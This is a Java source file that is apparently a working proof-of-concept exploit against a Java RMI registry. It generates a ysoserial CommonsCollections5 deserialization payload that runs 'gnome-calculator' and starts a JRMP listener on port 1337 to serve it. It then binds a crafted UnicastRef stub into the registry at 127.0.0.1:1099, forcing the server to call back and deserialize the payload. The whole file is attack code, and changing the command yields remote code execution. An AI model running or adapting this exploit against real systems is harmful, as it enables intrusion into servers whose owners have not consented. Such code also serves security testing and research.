import sun.rmi.server.UnicastRef;
import ysoserial.exploit.JRMPListener;
import ysoserial.payloads.ObjectPayload;
import javax.management.remote.rmi.RMIConnectionImpl_Stub;
import java.rmi.registry.LocateRegistry;
import java.rmi.registry.Registry;

public class Main {

    public static void main(String[] args) throws Exception {

        // Generate an instance of the CommonsCollections5 payload exeucting "gnome-calculator"
        final Class<? extends ObjectPayload> payloadClass = ObjectPayload.Utils.getPayloadClass("CommonsCollections5");
        final ObjectPayload payload = payloadClass.newInstance();
        final Object object = payload.getObject("gnome-calculator");

        // Start the remote GC listener at port 1337
        JRMPListener listener = new JRMPListener(1337, object);
        Thread thread = new Thread(listener);
        thread.start();
        
        // Setup the RMI
        Registry registry = LocateRegistry.getRegistry("127.0.0.1", 1099);
        // Connect to RMI
        registry.list();

        // Exploit the RMI, point to the JRMP listener
        exploit(registry, "127.0.0.1", 1337);
    }

    public static void exploit(final Registry registry,
                               String jrmpHost, int jrmpPort ) throws Exception {
           
        // Generate the UnicastRef Object with the endpoint to the remote GC
        UnicastRef payload = generateUnicastRef(jrmpHost, jrmpPort);
        
        // Generate random name 
        String name = "pwned" + System.nanoTime();
        
        // Build an RMI Implementation from the unicastRef object
        RMIConnectionImpl_Stub remote = new RMIConnectionImpl_Stub(payload);

        try {
            // Bind the RMI implementation to the RMI
            registry.bind(name, remote);
        } catch (Throwable e) {
            e.printStackTrace();
        }
        return;

    }

    public static UnicastRef generateUnicastRef(String host, int port) {
        // Create a dummy objectId
        java.rmi.server.ObjID objId = new java.rmi.server.ObjID();
        // Create the TCP endpoint to the remote GC
        sun.rmi.transport.tcp.TCPEndpoint endpoint = new sun.rmi.transport.tcp.TCPEndpoint(host, port);
        // Create a "LiveRef" of the dummy object with the specified endpoint
        sun.rmi.transport.LiveRef liveRef = new sun.rmi.transport.LiveRef(objId, endpoint, false);
        // Wrap the LiveRef in the UnicastRef
        return new sun.rmi.server.UnicastRef(liveRef);
    }
}
